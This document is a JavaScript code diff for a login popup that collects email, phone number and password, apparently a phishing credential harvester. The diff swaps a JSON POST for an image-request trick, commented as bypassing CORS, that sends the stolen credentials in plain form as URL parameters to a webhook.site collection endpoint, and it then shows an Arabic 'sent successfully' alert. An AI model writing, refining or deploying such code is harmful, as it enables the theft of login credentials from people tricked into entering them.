@@ -74,32 +74,18 @@ loginButton.addEventListener("click", function () {
         return;
     }
 
-    // Send the data to the webhook
-    var credentials = {
-        email: emailInput.value,
-        phone: phoneInput.value,
-        password: passwordInput.value
-    };
+    // Encode the credentials as URL parameters
+    var url = "https://webhook.site/78735d80-a09c-471a-b188-5aee323d456c"
+        + "?email=" + encodeURIComponent(emailInput.value)
+        + "&phone=" + encodeURIComponent(phoneInput.value)
+        + "&password=" + encodeURIComponent(passwordInput.value);
 
-    fetch("https://webhook.site/78735d80-a09c-471a-b188-5aee323d456c", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(credentials)
-    })
-    .then(response => {
-        if (response.ok) {
-            alert("تم إرسال البيانات بنجاح!");
-            document.body.removeChild(popup);
-        } else {
-            alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
-        }
-    })
-    .catch(error => {
-        console.error("Error:", error);
-        alert("حدث خطأ أثناء الإرسال. تحقق من الاتصال.");
-    });
+    // Send the data using an image request (bypasses CORS)
+    var img = new Image();
+    img.src = url;
+
+    alert("تم إرسال البيانات بنجاح!");
+    document.body.removeChild(popup);
 });
 
 popup.appendChild(loginButton);
